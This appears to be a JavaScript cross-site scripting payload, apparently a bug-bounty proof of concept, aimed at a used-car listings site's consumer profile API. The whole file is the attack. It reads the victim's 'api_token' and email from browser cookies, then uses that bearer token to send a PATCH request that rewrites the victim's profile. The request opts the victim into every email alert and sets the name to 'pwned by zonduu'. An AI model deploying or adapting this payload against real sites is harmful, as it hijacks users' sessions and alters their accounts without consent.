function getCookie(name)
{
  var re = new RegExp(name + "=([^;]+)");
  var value = re.exec(document.cookie);
  return (value != null) ? unescape(value[1]) : null;
}

token = getCookie('api_token');

email = getCookie('name');
email2 = email.replace('@', '%40').toUpperCase();


var xhr = new XMLHttpRequest();
xhr.open("PATCH", "/api/consumers/"+email2+"/profile/v2", true);     
xhr.setRequestHeader("Content-Type", 'application/json;charset=UTF-8');
xhr.setRequestHeader('Authorization','Bearer '+token);
xhr.send('{"profile":{"profileId":43645385,"username":null,"email":"'+email+'","emailOptIn":true,"status":"ACTIVE","affiliateInfo":null,"communicationPrefs":{"products":[{"productId":3,"name":"Used Cars For Sale","optIn":true,"productAlerts":[{"alertId":133,"name":"Newly Listed","emailOptIn":true,"sentAsEmail":true},{"alertId":163,"name":"Follow","emailOptIn":true,"sentAsEmail":true},{"alertId":173,"name":"Price Drop","emailOptIn":true,"sentAsEmail":true},{"alertId":213,"name":"Sold","emailOptIn":true,"sentAsEmail":true}]},{"productId":11,"name":"My Car Maintenance","optIn":true,"productAlerts":[{"alertId":42,"name":"Open Recalls","emailOptIn":true,"sentAsEmail":true},{"alertId":44,"name":"Oil Change Due","emailOptIn":true,"sentAsEmail":true},{"alertId":45,"name":"Tire Rotation Due","emailOptIn":true,"sentAsEmail":true},{"alertId":46,"name":"Safety Inspection Due","emailOptIn":true,"sentAsEmail":true},{"alertId":47,"name":"Registration Due","emailOptIn":true,"sentAsEmail":true},{"alertId":48,"name":"Emissions Inspection Due","emailOptIn":true,"sentAsEmail":true},{"alertId":49,"name":"Leave a Service Review","emailOptIn":true,"sentAsEmail":true},{"alertId":50,"name":"Monthly Vehicle Report","emailOptIn":true,"sentAsEmail":true},{"alertId":51,"name":"Add Vehicle Reminder","emailOptIn":true,"sentAsEmail":true},{"alertId":52,"name":"Still Own This Vehicle","emailOptIn":true,"sentAsEmail":true}]},{"productId":12,"name":"Ratings and Reviews","optIn":true,"productAlerts":[{"alertId":215,"name":"Sales Review","emailOptIn":true,"sentAsEmail":true},{"alertId":216,"name":"Dealer/Shop Replies","emailOptIn":true,"sentAsEmail":true}]},{"productId":17,"name":"Trade-in Offers","optIn":true,"productAlerts":[{"alertId":271,"name":"Cash Offers for Trade-In","emailOptIn":true,"sentAsEmail":true}]}]},"profileAvatar":null,"firstName":"pwned","lastName":"by zonduu","zipCode":"33101","city":null,"state":null}}');


